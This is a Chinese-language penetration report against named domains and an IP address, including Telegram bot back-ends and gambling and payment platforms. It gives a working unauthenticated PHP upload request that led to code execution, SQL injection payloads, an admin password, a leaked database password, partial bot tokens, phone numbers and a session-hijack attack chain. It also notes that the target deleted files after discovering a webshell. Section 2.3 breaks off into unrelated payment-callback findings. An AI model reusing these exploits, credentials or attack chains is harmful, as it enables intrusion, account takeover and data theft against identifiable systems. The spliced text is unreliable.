# 目标资产漏洞汇总报告

**范围**：aqlm.org / 999db.com 及其关联基础设施（卧龙 TG 机器人后台、zhuanfa TGBot 后台、hpay WordPress、openapi 钱包平台、pg 赌博平台、股票管理系统、dms 域名平台、Pritunl VPN、若干直连 IP）
**时间**：2026-09-16 ~ 2026-09-18
**方式**：授权 SRC 场景下的黑盒 + 白盒（PPay SDK/文档）测试；所有结论均以实测响应为准，已排除项单列，避免误报
**核心结论**：**已在一台目标服务器（111.230.17.248 / ThinkPHP dms 平台）上取得未授权任意文件上传 → PHP 代码执行（RCE）**；另在 4 个平台取得超管/后台控制权，6 类高危漏洞可在无凭据下复现。

## 2. 详细漏洞说明

### 2.1 「111.230.17.248」dms 域名平台（ThinkPHP 6.1 + PHP 8.2.28）—— **已取得 RCE**

#### V1【严重】未授权任意文件上传 → PHP 代码执行
- **入口**：`POST /index.php/api/images/upload`，multipart 字段名 **`file`**（1035 组字段名爆破得出），无需登录、无签名校验
- **落点**：`/data/web/dms/public/uploads/pz/<Ymd>/<md5>.<原始扩展名>`（URL 对应 `/uploads/pz/<Ymd>/...`）
- **扩展名不校验**：`.php / .phtml / .php5 / .phar / .PHP` 原样保留
- **复现**：

      POST /index.php/api/images/upload HTTP/1.1
      Host: 111.230.17.248
      Content-Type: multipart/form-data; boundary=----wb9f3a1c

      ------wb9f3a1c
      Content-Disposition: form-data; name="file"; filename="pwn.php"
      Content-Type: application/octet-stream

      <?php echo "PWN-MARKER"; ?>
      ------wb9f3a1c--

      响应: {"code":0,"message":"成功","data":{"picurl":"/uploads/pz/20260917/d1c07c141b8a2071af3b2383fd45c794.php"}}

- **执行证据**：

      GET /uploads/pz/20260917/d1c07c141b8a2071af3b2383fd45c794.php?c=id
      -> PWN-MARKER: <b>Fatal error</b>: Uncaught Error: Call to undefined function shell_exec()
         in /data/web/dms/public/uploads/...

  代码确实被执行，仅被 `disable_functions` 拦住了命令执行函数。
- **利用现状**：webshell 已能读取 `.env`、执行 mysqli/fsockopen/curl 等未被禁用函数。**当前失效原因**：对方在发现后删除了整个 `/uploads` 上传树（连他们自己的历史文章图片一起删了），导致 flysystem 创建日期目录失败（`UnableToCreateDirectory`），上传通道被动中断。

#### V15【高危】`.env` 泄露数据库与 Redis 凭据

      APP_DEBUG = true
      [DATABASE] TYPE=mysql HOSTNAME=127.0.0.1 DATABASE=domain USERNAME=domain PASSWORD=Z4jHAhrw4b6sypHT
      [redis] host=127.0.0.1 port=6379 password=(空)

- 该用户仅允许本机连接（外部连接返回 1045），必须配合代码执行使用；Redis 无认证但仅监听本机

#### V20【中危】后台文件管理器/上传端点未授权
- `GET /index.php/admin/upload/index`（KindEditor 风格）未登录即返回目录列表 JSON：`{"moveup_dir_path":"","current_dir_path":"","current_url":"/uploads/","total_count":0,"file_list":[]}`
- `?path=<任意路径>` 会把文件内容喂给 `imagecreatefromstring`（可用于探测文件是否可读）
- `POST /index.php/admin/upload/upload` 字段 `imgFile` 未授权可达（当前与 V1 同样受目录权限限制）

#### V21【中危】公开 API 信息泄露
| 接口 | 未授权返回 |
|---|---|
| `GET /index.php/api/index/system` | `{"webname":"Domain","amount_options":"300,1500,3000,5000,15000,30000","consult_id":"1346104692"}` |
| `GET /index.php/api/article/getArticle?cid=1&page=1` | 文章列表（标题/图片/时间/total），可遍历 cid 全站内容 |
| `GET /index.php/api/login/register?mobile=&password=&code=` | 注册接口未授权可达（校验顺序：手机号→密码长度→验证码） |
| `GET /index.php/api/login/sendCode`、`/forget` | 短信与找回接口未授权可达 |

#### V29【中低】后台登录防护薄弱
- 登录 `POST /index.php/admin/login/login.html`（username/password/code）
- 验证码为 **4 位数字**、**一次即失效**、无失败锁定；已实现 OCR 自动化（多预处理 + 数字投票），可长期低速爆破

### 2.2 「zhuanfa.aqlm.org」TGBot 管理后台（Tomcat 9.0.111 / JDK8 / kbs.webframework）

#### V5【高危】后台超管弱口令 + 无盐 MD5

      POST /admin/login {"username":"admin","password":"88888888","remember":"1"}
      -> {"errcode":0,"errmsg":""}   Cookie: BotAdmin=<128 hex>

- 无验证码、无锁定；`admins.password = 8ddcff3a80f4189ca1c9d4d902c3c909`（= MD5("88888888")，无盐）

#### V6【高危】未授权 SQL 注入（webhook）

      POST /forward/telegram/api/webhook?secret=<任意字符串>
      {"message":{"chat":{"title":"x' AND (SELECT 1 FROM (SELECT SLEEP(3))y)-- -"}, ...}}
      -> 响应 9.1~9.7s（正常 1.0s）

- `secret` 不校验；注入点：`chat.title`、`from.username`、`from.first_name`
- **副带写能力**：伪造 `/start` 消息实测在库中创建会员 `1000000001 / SRCTest`

#### V7【高危】认证后 SQL 注入 ×3
| 接口 | 参数 | 证据 |
|---|---|---|
| `POST /channelForward/user/query` | `username`、`userId` | `' AND (SELECT 1 FROM (SELECT SLEEP(4))x)-- -` → 9.1s |
| `POST /channelForward/bot/admin/query` | `botId` | SLEEP 延迟 5.1s |
| `POST /channelForward/user/account/chat/query` | `sort` | 延迟 20.9s（后确认非堆叠，见已排除项） |

#### V8【高危】数据库全读
- MySQL **8.0.44**、当前用户 **root@%**、容器主机名 `dbeb92e6ed2b`；17 张表
- 读出：`admins`、99 条会员（含 TG userId/@用户名/到期时间）、4 个 TG 采集账号（+14452950851 / +64226023067）、5 个采集频道、`monitor_account_servers`（中转服务器 `server-1 / 172.31.24.100:5667`）、`session_records`（233 条机器人会话上下文）
- 通过布尔盲注（`count=48` 为真 / `0` 为假）逐字符提取

#### V9【高危】Telegram 机器人令牌泄露
- `bots.token` 泄露 3 个有效令牌（官方 API `getMe` 验证通过）：
  - `7937546455:AAFL...`（@ZFGJbot）
  - `8584310995:AAE9...`（@ceshiwebot，webhook 指向 `zhuanfa.aqlm.org/forward/telegram/api/webhook?secret=523d...`）
  - `7666379287:AAFq...`（@bagqzhuanfabot）

### 2.3 「i.aqlm.org / web.aqlm.org」卧龙（WLZG）TG 机器人管理后台

#### V10【高危】未授权登录验证码泄露 → 会话固定/登录 CSRF

      POST /api/tg/user/login/code/get {"userName":"任意值"}
      -> {"code":0,"data":{"codeSn":"q57imuydorxd","msgCode":"895239"}}

- 验证码本应只发送到用户 Telegram，却直接返回给任意匿名调用者；`userName` 不做校验（admin/root/超长串/SQLi 串都发码）、无频率限制
- 登录第二步 `POST /api/tg/user/login/code/auto {"codeSn":...}`：**只认 codeSn、不校验 msgCode**；未确认返回 `{"sessionKey":null,"nickname":null}`，确认后返回 `sessionKey`（用于 `Authorization` 头）
- **攻击链（会话固定/登录 CSRF）**：攻击者为受害者 userName 取码 → 用真实码诱导受害者发给 @WLZGbot 确认（话术可信度 100%）→ 攻击者轮询自己的 codeSn 拿到**受害者 sessionKey** → 完全接管其机器人后台（群管理、抽奖/骰子即 PC28 配置、积分、会员）
- 平台侧现状：304 个 `/api/tg/**` 接口全部要求 sessionKey；`botType ∈ {av, bill, lottery, invite}`，**lottery 即彩票类（PC28 所在模块）**；`/tg/**`（Telegram 回调入口）对公网一律 503 拒绝

- 主动外连证据：订单过期后平台推送回调，来源 **18.166.99.42**、UA `go-resty/2.10.0`、带 `appid/signature` 头
- 危害：持商户账号者（钱包机器人可直接建商户）可驱使平台服务器向**内网/云元数据**发起请求；即使日后加白名单，仍可经 302 跳板绕过
- 限制（如实标注）：**盲 SSRF**，未取回内网响应内容

#### V22【中危】回调可无限重放
- 回调体字段无 `timestamp`、无 `nonce`，仅靠商户按 orderId 自行幂等 → 任何被截获的合法回调（含签名）可无限次重放

#### V23【中危】签名剔除空值字段 → 签名外可注入字段

      原签名 d19a5a3ab3315fa6ba2b4875780c11f9
      status=success      -> c76d1b02…  （签名变化，会被拦）
      amount=99.99        -> 2fe36345…  （签名变化，会被拦）
      actualAmount=99.99  -> 815e6fc6…  （签名变化，会被拦）
      追加 "foo":0        -> d19a5a3a…  （签名不变 ← 验签无法察觉）

#### V24【中危】下单幂等竞态（TOCTOU）

      顺序请求：第 2 次同 uniqueId -> 返回同一支付链接（幂等生效，符合文档）
      并发请求：2 并发 -> 2 条订单 + 2 条不同支付链接（违反文档承诺）
      不同金额并发：同一 uniqueId 下并存 amount=99.99 与 amount=0.01 两条订单

- 复现率约 1/6（提高并发可提升）；平台有限流（`请求太过频繁`）但 20 并发时仍有 2 条穿过

#### V25【中危】商户 appid 枚举 oracle + req_time 重放窗口

      appid=999  -> 非法数据      （不存在）
      appid=1000 -> 签名验证失败   （存在）
      appid=1587 -> 非法数据      （不存在）

- **有效商户 appid 为连续区间 1000..1586（587 个）**；三个签名接口 oracle 行为一致；无速率限制
- `req_time` 接受 ±约 10 分钟窗口，且签名算法中无 nonce → 截获的合法请求在 ~20 分钟窗口内可重放
